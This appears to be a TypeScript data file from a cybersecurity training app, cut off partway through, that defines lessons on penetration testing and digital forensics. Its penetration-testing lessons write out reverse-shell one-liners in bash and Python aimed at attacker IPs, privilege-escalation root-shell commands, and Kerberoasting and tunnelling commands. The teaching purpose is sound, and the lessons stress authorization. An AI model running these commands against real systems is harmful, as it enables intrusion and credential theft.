import { RoadmapPhase } from '../../types/cyber';

export const ROADMAP_PHASES_9_TO_12: RoadmapPhase[] = [
  {
    id: 9,
    title: 'Penetration Testing Methodologies',
    description: 'Learn authorized exploitation frameworks, reverse shells, privilege escalation on Linux and Windows, post-exploitation, and lateral movement.',
    level: 'advanced',
    badge: 'Phase 09',
    lessons: [
      {
        id: 'pentest-101',
        title: 'Penetration Testing Standards: PTES & Rules of Engagement',
        estimatedMinutes: 35,
        difficulty: 'beginner',
        prerequisites: ['vuln-101'],
        theory: 'Penetration testing is the authorized simulation of adversary attacks against computer systems to evaluate security posture. The Penetration Testing Execution Standard (PTES) defines seven core phases: Pre-engagement Interactions, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and Reporting. Rules of Engagement (ROE) legally establish authorized scope (IP ranges, domains), out-of-scope assets, testing time windows, communication channels, and emergency stop procedures.',
        steps: [
          'Review legal frameworks: Computer Fraud and Abuse Act (CFAA), UK Computer Misuse Act, and explicit written authorization requirements.',
          'Define Scope of Work (SOW): in-scope IP targets, excluded production databases, third-party cloud assets.',
          'Formulate Rules of Engagement (ROE): emergency contact protocols, testing schedules, IP allowlisting for client SOC.',
          'Understand test perspectives: Black Box (zero prior knowledge), Grey Box (partial knowledge / user credentials), and White Box (full source code & architecture access).'
        ],
        commands: [
          {
            command: 'cat roe_agreement.md',
            explanation: 'Inspect agreed testing boundaries, emergency contacts, and client sign-off parameters.'
          }
        ],
        practicalExample: 'Prior to testing a banking portal, the Rules of Engagement explicitly prohibit denial-of-service tests (`-T5` flooding), mandate testing only between 1:00 AM and 5:00 AM, and provide a 24/7 client phone number in case of unexpected service degradation.',
        exercise: 'Draft the essential sections required in a Penetration Testing Rules of Engagement (ROE) document.',
        expectedResult: 'Document containing: Executive Contacts, Authorized IP Ranges, Excluded Systems, Approved Testing Windows, Escalation Procedures, and Legal Authorization Signatures.',
        knowledgeCheck: {
          question: 'What is the absolute legal prerequisite that distinguishes authorized penetration testing from criminal hacking?',
          options: [
            'Using Kali Linux instead of Windows',
            'Explicit, written, legally binding authorization from the system owner defining scope and boundaries',
            'Using an encrypted VPN connection',
            'Reporting findings to social media'
          ],
          correctAnswerIndex: 1,
          explanation: 'Written consent and authorization from the system owner defines the legal boundary; testing without it constitutes a criminal offense regardless of intent.'
        }
      },
      {
        id: 'pentest-102',
        title: 'Metasploit Framework: Architecture, Auxiliary & Exploits',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['pentest-101', 'lin-103'],
        theory: 'The Metasploit Framework (MSF) is a comprehensive open-source penetration testing and exploit development platform. Modules are categorized into: Auxiliary (scanners, sniffers, fuzzers), Exploits (code executing a vulnerability), Payloads (code running post-exploit, e.g., shell or Meterpreter), Encoders (obfuscating payloads), Nops (NOP sled generators), and Post (post-exploitation data collection). Meterpreter provides an in-memory, dynamically extensible payload that avoids touching disk.',
        steps: [
          'Initialize the MSF database (`msfdb init`) to enable fast module searching and session tracking.',
          'Search for target modules using search syntax: `search type:exploit name:smb`.',
          'Configure exploit options: `set RHOSTS`, `set LHOST`, `set LPORT`.',
          'Select and configure staged vs. stageless payloads (`windows/x64/meterpreter/reverse_tcp` vs. `meterpreter_reverse_tcp`).'
        ],
        commands: [
          {
            command: 'msfdb run',
            explanation: 'Start the PostgreSQL database service and launch Metasploit console.'
          },
          {
            command: 'msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.10; run; exit"',
            explanation: 'Execute an automated Metasploit auxiliary scanner non-interactively.'
          }
        ],
        practicalExample: 'Auditing an outdated Windows Server 2008 VM in an authorized lab: selecting `exploit/windows/smb/ms17_010_eternalblue`, configuring `RHOSTS 192.168.1.50`, and executing `exploit` spawns a SYSTEM-level Meterpreter session.',
        exercise: 'Explain the difference between a staged payload (e.g. `windows/meterpreter/reverse_tcp`) and a stageless payload (e.g. `windows/meterpreter_reverse_tcp`).',
        expectedResult: 'A staged payload uses a tiny initial stager to pull the larger Meterpreter DLL over the network; a stageless payload contains the entire payload in one binary.',
        knowledgeCheck: {
          question: 'What is the primary advantage of the Meterpreter payload compared to a basic command prompt shell?',
          options: [
            'It works without network connectivity',
            'It executes entirely in-memory using DLL injection without writing files to disk, providing built-in pivoting, token stealing, and screenshot capabilities',
            'It is completely unblockable by any software',
            'It works on routers only'
          ],
          correctAnswerIndex: 1,
          explanation: 'Meterpreter operates entirely in RAM via reflective DLL injection, reducing forensic disk artifacts and providing advanced post-exploitation modules.'
        }
      },
      {
        id: 'pentest-103',
        title: 'Reverse Shells, Bind Shells & Netcat Mastery',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['lin-103', 'net-101'],
        theory: 'A Bind Shell opens a listening socket on the target machine, waiting for the attacker to connect to it (often blocked by inbound target firewalls). A Reverse Shell instructs the target machine to initiate an outbound connection back to the attacker\'s listening machine, bypassing inbound firewall restrictions (since firewalls typically allow outbound connections). Upgrading raw netcat shells to fully interactive TTY shells (pty) allows tab completion, text editors (nano/vim), and job control.',
        steps: [
          'Set up an attacker listener: `nc -lvnp 4444`.',
          'Generate reverse shell payloads in Bash, Python, PHP, and Perl.',
          'Upgrade dumb reverse shells using Python pty module: `python3 -c \'import pty; pty.spawn("/bin/bash")\'`.',
          'Configure terminal dimensions and stty raw echo for seamless terminal interaction.'
        ],
        commands: [
          {
            command: 'nc -lvnp 4444',
            explanation: 'Start a Netcat listener on all interfaces port 4444 with verbose output.'
          },
          {
            command: 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1',
            explanation: 'Native interactive Linux bash reverse shell directed to attacker IP.'
          },
          {
            command: 'stty raw -echo; fg',
            explanation: 'Configure local terminal driver to pass control codes (Ctrl+C, arrows) directly to remote shell.'
          }
        ],
        practicalExample: 'When an attacker gains a web shell via PHP file upload, running `python3 -c "import pty; pty.spawn(\'/bin/bash\')"` followed by backgrounding the shell (`Ctrl+Z`) and typing `stty raw -echo; fg` produces a full VT100 interactive shell.',
        exercise: 'Write a one-line Python 3 reverse shell connecting to 10.10.14.2 on port 9001.',
        expectedResult: '`python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'`',
        knowledgeCheck: {
          question: 'Why are reverse shells almost universally preferred over bind shells during external penetration tests?',
          options: [
            'Reverse shells are faster',
            'Enterprise egress firewalls usually permit outbound traffic on common ports (80, 443), while inbound traffic to target ports is almost always dropped by edge firewalls',
            'Bind shells cannot transmit text',
            'Reverse shells do not require IP addresses'
          ],
          correctAnswerIndex: 1,
          explanation: 'Perimeter firewalls block incoming connections to arbitrary ports, but usually allow machines inside the network to establish outgoing TCP connections to the internet.'
        }
      },
      {
        id: 'pentest-104',
        title: 'Linux Privilege Escalation: SUID, Sudo & Cron Jobs',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['lin-103', 'pentest-103'],
        theory: 'Privilege Escalation transitions access from a low-privileged service account (e.g., `www-data`) to full root privileges (`UID 0`). Common Linux vectors include misconfigured SUID binaries (Set User ID running as root), overpermissive sudo rules (`sudo -l` showing binaries like vim or find without password), writable cron scripts running on periodic schedules, unquoted service paths, and outdated Linux kernels with known vulnerabilities.',
        steps: [
          'Enumerate current privileges: `id`, `whoami`, `sudo -l`.',
          'Search for SUID binaries owned by root: `find / -perm -4000 -type f 2>/dev/null`.',
          'Cross-reference identified binaries with GTFOBins (repository of Unix binaries usable to bypass security boundaries).',
          'Automate internal enumeration using LinPEAS or `linenum.sh` scripts.'
        ],
        commands: [
          {
            command: 'find / -perm -u=s -type f 2>/dev/null',
            explanation: 'Locate all executable files on system with the SUID bit set.'
          },
          {
            command: 'sudo -l',
            explanation: 'List current user\'s allowed (and forbidden) sudo privileges on the machine.'
          },
          {
            command: 'crontab -l; cat /etc/crontab /etc/cron.*/*',
            explanation: 'Inspect system-wide scheduled cron tasks and their execution permissions.'
          }
        ],
        practicalExample: '`sudo -l` reveals `(root) NOPASSWD: /usr/bin/find`. Checking GTFOBins shows running `sudo find . -exec /bin/sh \\; -quit` spawns an instant root shell without prompting for credentials.',
        exercise: 'Explain why granting `sudo /usr/bin/less` to an unprivileged user is equivalent to granting full root access.',
        expectedResult: 'Inside the `less` pager, typing `!/bin/sh` executes a command shell inheriting root privileges from the parent sudo process.',
        knowledgeCheck: {
          question: 'What is the curated online catalogue that documents how to exploit Unix binaries (sudo/SUID) to bypass security boundaries or escalate privileges?',
          options: ['GitHub', 'GTFOBins', 'StackOverflow', 'Wikipedia'],
          correctAnswerIndex: 1,
          explanation: 'GTFOBins is the authoritative security community reference documenting Unix binaries that can be abused for privilege escalation, file read/write, and reverse shells.'
        }
      },
      {
        id: 'pentest-105',
        title: 'Linux Capabilities & Kernel Exploits',
        estimatedMinutes: 40,
        difficulty: 'advanced',
        prerequisites: ['pentest-104'],
        theory: 'Linux Capabilities divide traditional root power into distinct granular units (e.g., `CAP_SETUID`, `CAP_NET_BIND_SERVICE`, `CAP_SYS_ADMIN`), avoiding monolithic SUID binaries. However, improperly assigned capabilities (like `CAP_SETUID` on python3 or perl) allow users to set their effective UID to 0. Kernel exploits (e.g., Dirty COW, Dirty Pipe) exploit memory corruption bugs in the kernel core to overwrite read-only files (like `/etc/passwd`) to achieve root.',
        steps: [
          'Enumerate binary capabilities: `getcap -r / 2>/dev/null`.',
          'Exploit `cap_setuid+ep` on scripting interpreters to elevate to root.',
          'Check kernel version: `uname -a`.',
          'Identify kernel vulnerabilities safely using `linux-exploit-suggester.sh` without destabilizing systems.'
        ],
        commands: [
          {
            command: 'getcap -r / 2>/dev/null',
            explanation: 'Recursively search the filesystem for files with extended Linux capabilities set.'
          },
          {
            command: '/usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
            explanation: 'Elevate to root UID when Python has cap_setuid capability enabled.'
          }
        ],
        practicalExample: 'An auditor runs `getcap -r / 2>/dev/null` and finds `/usr/bin/tar = cap_dac_read_search+ep`. This capability bypasses all file read permission checks, enabling the auditor to archive and read `/etc/shadow`.',
        exercise: 'Explain the security implications of the `CAP_DAC_OVERRIDE` capability on an executable.',
        expectedResult: 'It bypasses all file read, write, and execute permission checks, allowing arbitrary modification of system files like `/etc/passwd`.',
        knowledgeCheck: {
          question: 'What command displays the current Linux kernel release and system architecture?',
          options: ['ls -la', 'uname -a', 'cat /etc/hosts', 'pwd'],
          correctAnswerIndex: 1,
          explanation: '`uname -a` prints kernel version, host name, compile date, and processor architecture.'
        }
      },
      {
        id: 'pentest-106',
        title: 'Windows Privilege Escalation: Tokens, Services & Unquoted Paths',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['pentest-103'],
        theory: 'Privilege escalation on Windows environments targets elevating local users or service accounts (e.g., `IIS_IUSRS`, `NETWORK SERVICE`) to `NT AUTHORITY\\SYSTEM`. Primary vectors include Unquoted Service Paths (Windows path parsing ambiguity), weak service permissions (allowing binPath reconfiguration), AlwaysInstallElevated registry keys (MSI execution with SYSTEM rights), and token manipulation (SeImpersonatePrivilege / RottenPotato / PrintSpoofer).',
        steps: [
          'Enumerate Windows user privileges: `whoami /priv` (check for SeImpersonatePrivilege, SeBackupPrivilege).',
          'Identify unquoted service paths: `wmic service get name,displayname,pathname,startmode`.',
          'Automate Windows enumeration using WinPEAS and PowerUp.',
          'Execute token impersonation payloads (e.g. GodPotato) to escalate from service accounts to SYSTEM.'
        ],
        commands: [
          {
            command: 'whoami /priv',
            explanation: 'Display assigned user privileges and security tokens in Windows command prompt.'
          },
          {
            command: 'sc qc TargetService',
            explanation: 'Query Windows service configuration, binary path name, and startup account.'
          }
        ],
        practicalExample: 'A service path is set to `C:\\Program Files\\Custom App\\service.exe` without quotes. Windows checks `C:\\Program.exe`, then `C:\\Program Files\\Custom.exe` before the real path. If an attacker has write permissions in `C:\\`, planting `Program.exe` gains SYSTEM upon service reboot.',
        exercise: 'Explain why having `SeImpersonatePrivilege` enabled on a Windows service account frequently leads to SYSTEM compromise.',
        expectedResult: 'It permits the process to impersonate a client token; potato-style exploits coerce a SYSTEM-level service (like RPC or BITS) to authenticate to a local pipe and hijack its SYSTEM token.',
        knowledgeCheck: {
          question: 'What Windows utility displays active assigned privileges for the current security context?',
          options: ['dir', 'whoami /priv', 'ipconfig', 'tasklist'],
          correctAnswerIndex: 1,
          explanation: '`whoami /priv` lists all assigned privileges (such as SeDebugPrivilege, SeImpersonatePrivilege) and their current state (Enabled/Disabled).'
        }
      },
      {
        id: 'pentest-107',
        title: 'Active Directory Fundamentals: Kerberos & Domain Enumeration',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['net-101', 'pentest-106'],
        theory: 'Active Directory (AD) is Microsoft\'s centralized identity and directory service utilized by 90%+ of global enterprises. AD components include Domain Controllers (DC), Forest/Trees, Organizational Units (OUs), and Group Policy Objects (GPOs). Authentication relies on Kerberos v5, which uses tickets (Ticket Granting Ticket - TGT, and Ticket Granting Service - TGS) issued by the Key Distribution Center (KDC). BloodHound and SharpHound visualize AD relationships and attack paths.',
        steps: [
          'Understand Kerberos authentication: AS-REQ / AS-REP, TGS-REQ / TGS-REP, and AP-REQ.',
          'Enumerate Domain Controllers, users, and groups using `net user /domain` and PowerView.',
          'Collect Active Directory attack graphs using BloodHound ingestor (SharpHound).',
          'Analyze shortest attack paths to `Domain Admins` group in BloodHound GUI.'
        ],
        commands: [
          {
            command: 'net user /domain',
            explanation: 'List all user accounts registered in the active Windows domain.'
          },
          {
            command: 'crackmapexec smb 192.168.1.0/24 -u user -p pass --shares',
            explanation: 'Enumerate accessible SMB shares and domain authentication across entire subnet.'
          }
        ],
        practicalExample: 'SharpHound collects domain data. Opening BloodHound reveals: User A is in Group Helpdesk, which has GenericAll rights over Computer B, where Domain Admin User C has an active session, establishing a 3-step path to domain takeover.',
        exercise: 'Explain what an SPN (Service Principal Name) is in Active Directory.',
        expectedResult: 'A unique identifier for a service instance (like MSSQL or HTTP) mapped to a domain user account, used by Kerberos to encrypt TGS tickets.',
        knowledgeCheck: {
          question: 'Which tool is the industry standard for mapping Active Directory trust relationships and calculating privilege escalation paths to Domain Admin?',
          options: ['BloodHound', 'Nessus', 'Wireshark', 'Hydra'],
          correctAnswerIndex: 0,
          explanation: 'BloodHound uses graph theory to visualize Active Directory relationships, permissions, and shortest escalation paths to high-value targets.'
        }
      },
      {
        id: 'pentest-108',
        title: 'Active Directory Attacks: Kerberoasting & AS-REP Roasting',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['pentest-107'],
        theory: 'Kerberoasting requests Kerberos TGS tickets for domain user accounts with registered Service Principal Names (SPNs). The ticket is encrypted with the service account\'s NTLM password hash. Any authenticated domain user can request these tickets and extract them to crack the plain-text password offline with Hashcat or John the Ripper. AS-REP Roasting targets user accounts that have "Do not require Kerberos preauthentication" configured.',
        steps: [
          'Locate accounts with SPNs configured: `GetUserSPNs.py` (Impacket).',
          'Request TGS ticket and save in hashcat-compatible format (`$krb5tgs$23$*`).',
          'Locate accounts vulnerable to AS-REP Roasting with `GetNPUsers.py`.',
          'Crack captured ticket hashes offline using rockyou.txt wordlist and Hashcat mode 13100 / 18200.'
        ],
        commands: [
          {
            command: 'impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt',
            explanation: 'Query domain for user accounts with SPNs, request TGS tickets, and dump hashes.'
          },
          {
            command: 'hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt',
            explanation: 'Crack Kerberos 5 TGS-REP etype 23 ticket hashes offline using GPU acceleration.'
          }
        ],
        practicalExample: 'An organization creates a service account `sql_service` with domain admin privileges and sets a weak password `Summer2024!`. Running `GetUserSPNs.py` dumps the hash, and Hashcat recovers the password in 4 seconds.',
        exercise: 'Identify the remediation that renders Kerberoasting attacks computationally infeasible.',
        expectedResult: 'Enforce Group Managed Service Accounts (gMSA) with 120-character auto-generated complex passwords, or set service account passwords to $\\ge 25$ characters.',
        knowledgeCheck: {
          question: 'Why does Kerberoasting not trigger account lockouts on the domain controller?',
          options: [
            'Because Kerberos disables lockouts',
            'Because the ticket is requested once legitimately; all password guessing is performed entirely offline on the attacker\'s GPU',
            'Because tickets are not logged',
            'Because it uses UDP'
          ],
          correctAnswerIndex: 1,
          explanation: 'Since the encrypted ticket is obtained in a single legitimate query, billions of password attempts are tested offline without contacting the Domain Controller.'
        }
      },
      {
        id: 'pentest-109',
        title: 'Network Pivoting, Port Forwarding & Chisel Tunnels',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['pentest-103', 'net-101'],
        theory: 'When a penetration tester compromises a multi-homed dual-NIC host (e.g., exposed web server connected to both public DMZ and private internal LAN), pivoting allows routing traffic through that compromised machine to attack internal unreachable subnets. Techniques include SSH dynamic port forwarding (`-D`), Proxychains, and modern HTTP/TCP tunneling tools like Chisel, Ligolo-ng, and Socat.',
        steps: [
          'Inspect network interfaces on compromised host: `ip a` or `ipconfig /all`.',
          'Identify secondary internal subnets (e.g., 10.10.10.0/24).',
          'Deploy Chisel client on compromised host and Chisel server on attacker Kali machine.',
          'Configure `/etc/proxychains4.conf` to route scanner traffic through the established SOCKS5 proxy.'
        ],
        commands: [
          {
            command: 'chisel server -p 8000 --reverse',
            explanation: 'Start Chisel reverse tunnel server on Kali listener.'
          },
          {
            command: './chisel client 10.10.14.5:8000 R:1080:socks',
            explanation: 'Connect from compromised pivot host back to Kali, exposing internal network via SOCKS5 port 1080.'
          },
          {
            command: 'proxychains4 nmap -sT -Pn -p 80,445 10.10.10.50',
            explanation: 'Scan an internal unreachable target through the Proxychains SOCKS tunnel.'
          }
        ],
        practicalExample: 'Target machine `10.10.10.50` is invisible from the internet. By routing packets through the compromised web server at `192.168.1.20` using Chisel and Proxychains, an auditor logs into the internal Active Directory portal.',
        exercise: 'Explain why TCP Connect scans (`-sT`) must be used with Proxychains rather than SYN scans (`-sS`).',
        expectedResult: 'Proxychains operates at the user-space socket layer through SOCKS; raw SYN packets cannot traverse standard TCP SOCKS proxies.',
        knowledgeCheck: {
          question: 'What configuration file on Kali Linux defines the SOCKS proxy ports used by proxychains?',
          options: ['/etc/hosts', '/etc/resolv.conf', '/etc/proxychains4.conf', '/etc/shadow'],
          correctAnswerIndex: 2,
          explanation: '`/etc/proxychains4.conf` specifies the proxy list (e.g. `socks5 127.0.0.1 1080`) and chaining behavior.'
        }
      },
      {
        id: 'pentest-110',
        title: 'Post-Exploitation, Persistence & Cleanup Protocols',
        estimatedMinutes: 40,
        difficulty: 'advanced',
        prerequisites: ['pentest-101', 'pentest-104'],
        theory: 'Post-Exploitation evaluates the realistic business impact of a compromise (data sensitivity, customer PII access, financial records) rather than merely obtaining root. Persistence explores how adversaries maintain access across reboots (scheduled tasks, registry run keys, SSH authorized_keys). Crucially, ethical penetration testing mandates meticulous remediation notes and cleanup protocols: every uploaded test script, user account, or backdoor MUST be completely removed.',
        steps: [
          'Document Proof-of-Concept (POC) evidence: hostname, IP configuration, user identity, sanitized data snippets.',
          'Identify persistence mechanisms that adversaries simulate (cron, services, startup keys).',
          'Maintain a timestamped audit log of all files created, commands executed, and accounts modified.',
          'Execute decommissioning and cleanup verification checklist before submitting final report.'
        ],
        commands: [
          {
            command: 'cat /var/log/auth.log | grep -i "session opened"',
            explanation: 'Verify session open and close records to record accurate testing timelines.'
          },
          {
            command: 'rm -f /tmp/linpeas.sh /tmp/chisel',
            explanation: 'Delete all test artifacts and enumeration scripts placed on target machine.'
          }
        ],
        practicalExample: 'During testing, an analyst creates an administrative test account `pentest_audit`. The cleanup protocol requires removing this user account, deleting their home folder, and verifying no residual SSH keys remain in `authorized_keys`.',
        exercise: 'Draft a three-point Cleanup Checklist for an assessor concluding a client engagement.',
        expectedResult: '1. Remove all uploaded binary payloads and scripts from /tmp. 2. Delete test user accounts. 3. Revert configuration files to pre-test state.',
        knowledgeCheck: {
          question: 'What is the professional ethical responsibility regarding test artifacts deposited on client machines during a penetration test?',
          options: [
            'Leave them on the server as proof of concept',
            'Every test script, binary, temporary file, and test account must be meticulously logged and completely removed prior to engagement conclusion',
            'Sell them to third parties',
            'Change system passwords and keep access'
          ],
          correctAnswerIndex: 1,
          explanation: 'Leaving test binaries or accounts exposes the client to accidental compromise by real threat actors; thorough cleanup is mandatory.'
        }
      }
    ]
  },
  {
    id: 10,
    title: 'Digital Forensics & Incident Response',
    description: 'Master live memory forensics, disk acquisition, chain of custody, timeline analysis, Windows event logs, and malware triage.',
    level: 'advanced',
    badge: 'Phase 10',
    lessons: [
      {
        id: 'dfir-101',
        title: 'DFIR Fundamentals: Order of Volatility & Chain of Custody',
        estimatedMinutes: 35,
        difficulty: 'beginner',
        prerequisites: ['lin-101'],
        theory: 'Digital Forensics and Incident Response (DFIR) investigates cyber security breaches to identify root cause, scope of compromise, and attribution while preserving evidentiary integrity. The RFC 3227 Order of Volatility dictates collecting the most transient data first before it disappears: 1) CPU registers/cache, 2) Routing tables, ARP cache, process table, kernel statistics, 3) System memory (RAM), 4) Temporary filesystems, 5) Disk storage, 6) Remote logging/topologies, 7) Archival media. Chain of Custody legally documents custody from acquisition to court.',
        steps: [
          'Memorize RFC 3227 Order of Volatility hierarchy.',
          'Maintain Chain of Custody forms: description of evidence, serial numbers, date/time acquired, signatures.',
          'Verify cryptographic hash integrity: compute SHA-256 before and after imaging.',
          'Operate exclusively on forensically verified image copies, never on original physical media.'
        ],
        commands: [
          {
            command: 'sha256sum evidence_drive.raw > hash_manifest.txt',
            explanation: 'Compute cryptographic SHA-256 fingerprint of disk image for legal evidence validation.'
          }
        ],
        practicalExample: 'Powering off an infected computer immediately wipes all RAM contents, destroying volatile malware injected in-memory (e.g. Cobalt Strike beacons). A forensic responder captures live memory first before shutting down or isolating the device.',
        exercise: 'Rank the following evidence types in order of volatility according to RFC 3227: Physical Hard Drive, System RAM, CPU Cache, ARP Table.',
        expectedResult: '1. CPU Cache, 2. ARP Table, 3. System RAM, 4. Physical Hard Drive.',
        knowledgeCheck: {
          question: 'What happens to evidentiary integrity in court if an investigator analyzes evidence directly on the original disk drive without write-blockers or hashing?',
          options: [
            'It is rewarded for speed',
            'The evidence can be ruled inadmissible because booting or mounting the drive alters access timestamps and file contents',
            'The data automatically encrypts itself',
            'Nothing happens'
          ],
          correctAnswerIndex: 1,
          explanation: 'Mounting media without write-blockers modifies metadata and access times. Forensics must work on bit-stream copies verified against cryptographic hashes.'
        }
      },
      {
        id: 'dfir-102',
        title: 'Disk Imaging & Forensic Acquisition (dd / dc3dd)',
        estimatedMinutes: 40,
        difficulty: 'intermediate',
        prerequisites: ['dfir-101', 'lin-103'],
        theory: 'Forensic disk acquisition creates an exact, bit-by-bit physical copy (bitstream image) of a storage drive, including unallocated space, slack space, and deleted file remnants. Hardware write-blockers prevent the forensic workstation from writing any data to the target media. Utilities like `dd`, `dc3dd` (Department of Defense Cyber Crime Center enhanced dd), and FTK Imager produce raw (.dd, .raw) or Expert Witness Format (.E01) images with integrated hash verification.',
        steps: [
          'Connect evidence media through a certified hardware or software write-blocker.',
          'Verify write-block status with `lsblk` and `blockdev --getro`.',
          'Execute physical disk imaging using `dc3dd` with simultaneous MD5/SHA256 calculation.',
          'Store generated image in a secure, write-protected repository.'
        ],
        commands: [
          {
            command: 'sudo dc3dd if=/dev/sdb of=/evidence/suspect_drive.raw hash=sha256 log=/evidence/imaging.log',
            explanation: 'Acquire bit-stream physical image of /dev/sdb with real-time SHA-256 hashing and audit log.'
          },
          {
            command: 'sudo blockdev --setro /dev/sdb',
            explanation: 'Enforce software write-protection mode on evidence storage block device.'
          }
        ],
        practicalExample: 'When an employee formats a USB drive before resigning, a bit-stream physical image captures the unallocated clusters where deleted files remain intact until overwritten by new data.',
        exercise: 'Explain the difference between a logical file copy and a physical bit-stream image.',
        expectedResult: 'A logical copy only captures active files visible to the operating system; a physical image copies every raw block including deleted files, slack space, and partition tables.',
        knowledgeCheck: {
          question: 'What is the purpose of a hardware write-blocker during digital evidence acquisition?',
          options: [
            'To format the evidence drive quickly',
            'To intercept and discard any write commands sent from the forensic workstation to the evidence drive, preventing accidental modification',
            'To double the data transfer speed',
            'To compress images automatically'
          ],
          correctAnswerIndex: 1,
          explanation: 'Write-blockers physically guarantee that read-only access is enforced, ensuring the original evidence remains pristine and untampered.'
        }
      },
      {
        id: 'dfir-103',
        title: 'Memory Forensics & RAM Analysis with Volatility 3',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['dfir-101'],
        theory: 'Volatile memory (RAM) holds active network connections, decrypted BitLocker keys, running injected code, plaintext passwords, unencrypted chat logs, and injected DLLs. Volatility 3 is the industry standard framework for offline analysis of memory dumps (.raw, .vmem, .dmp). Key plugins inspect running processes (`windows.pslist`), hidden/unlinked processes (`windows.psscan`), network sockets (`windows.netscan`), and injected code blocks (`windows.malfind`).',
        steps: [
          'Capture memory image using LiME (Linux) or DumpIt / WinPmem (Windows).',
          'Run `windows.pslist` to view process hierarchy, start times, and parent PIDs.',
          'Detect rootkit unlinking with `windows.psscan` comparing active list against memory tags.',
          'Execute `windows.malfind` to discover memory regions with `PAGE_EXECUTE_READWRITE` permissions.'
        ],
        commands: [
          {
            command: 'vol -f memory.raw windows.pslist',
            explanation: 'List active processes in Windows memory capture with PIDs and PPIDs.'
          },
          {
            command: 'vol -f memory.raw windows.netscan',
            explanation: 'Extract active and terminated TCP/UDP sockets, local/remote IPs, and owning PIDs.'
          },
          {
            command: 'vol -f memory.raw windows.malfind',
            explanation: 'Identify hidden or injected code segments in process memory spaces.'
          }
        ],
        practicalExample: 'Malware uses Process Injection to hollow out `svchost.exe`. `windows.malfind` flags a memory region inside PID 1420 with Read-Write-Execute permissions containing an `MZ` header, exposing the injected Trojan.',
        exercise: 'Explain what finding an `MZ` header (4D 5A) inside an injected memory buffer indicates.',
        expectedResult: 'It indicates the presence of a Windows Portable Executable (PE) binary (EXE or DLL) embedded in RAM.',
        knowledgeCheck: {
          question: 'Which Volatility 3 plugin is used to identify injected shellcode and rogue DLLs in process memory spaces?',
          options: ['windows.info', 'windows.malfind', 'windows.filescan', 'windows.registry'],
          correctAnswerIndex: 1,
          explanation: '`windows.malfind` detects memory regions with anomalous execution permissions (PAGE_EXECUTE_READWRITE) commonly indicative of process injection.'
        }
      },
      {
        id: 'dfir-104',
        title: 'Windows Event Log Analysis & Event IDs for Incident Responders',
        estimatedMinutes: 45,
        difficulty: 'intermediate',
        prerequisites: ['dfir-101'],
        theory: 'Windows Event Logs (.evtx) are the premier data source for detecting attacks across Windows enterprises. Logs are partitioned into Security, System, Application, and dedicated ETW channels (e.g., Microsoft-Windows-Sysmon/Operational). High-priority Event IDs include 4624 (Successful Logon - type 3 network, type 10 RDP), 4625 (Failed Logon - brute force), 4720 (User Created), 7045 (Service Installed - persistence), and 4688 / Sysmon Event ID 1 (Process Creation with Command Line).',
        steps: [
          'Understand Logon Types: 2 (Interactive/Console), 3 (Network/SMB), 10 (RemoteInteractive/RDP).',
          'Query event logs using PowerShell `Get-WinEvent` and filter XML XPath.',
          'Correlate Sysmon Event ID 1 (Process Creation with parent-child process tree and command arguments).',
          'Detect lateral movement via Event 4624 Type 3 followed by Event 7045 (Psexec service installation).'
        ],
        commands: [
          {
            command: 'Get-WinEvent -FilterHashtable @{LogName=\'Security\'; Id=4625} -MaxEvents 10',
            explanation: 'Query recent failed logon attempts from the Windows Security Event Log.'
          },
          {
            command: 'chainsaw hunt evtx_logs/ -s sigma_rules/ --mapping mappings/sigma-event-logs-all.yml',
            explanation: 'Rapidly triage and hunt for adversary activity in .evtx files using Chainsaw and Sigma rules.'
          }
        ],
        practicalExample: 'An attacker uses PsExec to move laterally. Event logs record: Event 4624 (Logon Type 3 from attacker IP) -> Event 7045 (New service `PSEXESVC` created with binPath pointing to cmd.exe) -> Sysmon Event 1 (whoami.exe launched by PSEXESVC).',
        exercise: 'Explain the diagnostic significance of Windows Logon Type 10.',
        expectedResult: 'Logon Type 10 represents Remote Interactive access, indicating someone logged into the system via Remote Desktop Protocol (RDP).',
        knowledgeCheck: {
          question: 'Which Windows Security Event ID signifies that a new user account was created on the system?',
          options: ['4624', '4625', '4720', '1102'],
          correctAnswerIndex: 2,
          explanation: 'Event ID 4720 explicitly tracks user account creation events, documenting which administrator created the new identity.'
        }
      },
      {
        id: 'dfir-105',
        title: 'Mastering Windows Forensic Artifacts: Amcache, Shimcache & Prefetch',
        estimatedMinutes: 45,
        difficulty: 'advanced',
        prerequisites: ['dfir-104'],
        theory: 'When an attacker deletes malware binaries, evidentiary proof of execution remains preserved across specialized Windows operating system forensic artifacts. Prefetch files (`.pf` in `C:\\Windows\\Prefetch`) prove execution, execution count, and last run timestamp. Shimcache (AppCompatCache in SYSTEM registry hive) tracks binary execution and full path. Amcache (`Amcache.hve`) records SHA-1 hashes of executed binaries. UserAssist records GUI program launches.',
        steps: [
          'Parse Prefetch directory using Eric Zimmerman\'s PECmd tool.',
          'Extract Shimcache execution records using `AppCompatCacheParser`.',
          'Parse Amcache hive to identify unlinked malware SHA-1 hashes and compilation timestamps.',
          'Reconstruct program execution timeline proving when an attacker tool was run.'
        ],
        commands: [
          {
            command: 'PECmd.exe -d "C:\\Windows\\Prefetch" --csv ./prefetch_out',
            explanation: 'Parse all Windows Prefetch files into structured CSV timeline format.'
          },
          {
            command: 'AmcacheParser.exe -f "C:\\Windows\\appcompat\\Programs\\Amcache.hve" --csv ./amcache_out',
            explanation: 'Extract program execution history and cryptographic file hashes from Amcache.'
          }
        ],
